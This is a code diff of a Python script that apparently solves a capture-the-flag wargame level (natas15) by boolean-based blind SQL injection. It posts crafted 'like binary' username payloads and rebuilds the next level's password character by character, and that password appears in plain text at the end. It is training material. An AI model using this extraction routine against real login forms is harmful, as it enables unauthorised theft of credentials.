@@ -64,7 +64,7 @@ div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {
 print(f'{div_content}\n')
 
 
-# PART I
+# PART I: get the components of the password
 # so far, the password only contains ascii letters and digits
 # the following prepares all possible characters in a password
 possible_chars = string.ascii_letters + string.digits
@@ -72,10 +72,38 @@ possible_chars = string.ascii_letters + string.digits
 password_chars = ""
 for char in possible_chars:
     data = {
-        'username' : f'natas16" and password like "%{char}%" #A ',
+        # we need to use binary to perform case sensitive query
+        'username' : f'natas16" and password like binary "%{char}%" #A ',
         'submit' : 'submit'
     }
     response = session.post(URL, data=data)
+    print(f'characters in the password: {password_chars + char}', end='\r')
     if re.search(r'This user exists', response.text):
         password_chars += char
-        print(f'characters in the password: {password_chars}')
+        print(f'characters in the password: {password_chars}', end='\r')
+print('\n')
+
+
+# PART II: constructing the password
+# now that we know every character in the password, we can try to build the password from the known characters
+password = ""
+# note that, so far, the password has been 32 characters long
+for i in range(32):
+    for char in possible_chars:
+        data = {
+            # we need to use binary to perform case sensitive query
+            'username' : f'natas16" and password like binary "{password + char}%" #A ',
+            'submit' : 'submit'
+        }
+        print(f'password: {password + char}', end='\r')
+        response = session.post(URL, data=data)
+        if re.search(r'This user exists', response.text):
+            password += char
+            print(f"password: {password}", end='\r')
+            # move to the next character
+            break
+print('\n')
+
+
+# natas16 password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+print(f'natas16 password: {password}')
